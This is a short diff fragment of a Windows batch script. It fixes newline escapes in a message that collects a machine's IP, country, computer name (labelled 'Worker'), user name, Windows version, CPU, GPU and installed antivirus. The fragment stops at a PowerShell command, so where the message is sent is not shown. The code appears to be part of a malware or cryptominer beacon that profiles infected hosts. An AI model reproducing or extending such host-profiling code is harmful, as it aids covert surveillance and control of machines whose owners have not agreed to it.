@@ -21,7 +21,7 @@ for /f "tokens=*" %a in ('powershell -Command "try { (Get-CimInstance -Namespace
 set "UserName=%USERNAME%"
 set "Worker=%COMPUTERNAME%"
 
-set "message=RUSnIP: %IP%nCountry: %Country%nWorker: %Worker%nUserName: %UserName%nWindows: %Windows% %Arch%nCPU: %CPU%nGPU: %GPU%nAntivirus: %Antivirus%"
+set "message=RUS\nIP: %IP%\nCountry: %Country%\nWorker: %Worker%\nUserName: %UserName%\nWindows: %Windows% %Arch%\nCPU: %CPU%\nGPU: %GPU%\nAntivirus: %Antivirus%"
 
 powershell -NoProfile -Command ^
   "[System.Console]::OutputEncoding = [System.Text.Encoding]::UTF8;" ^
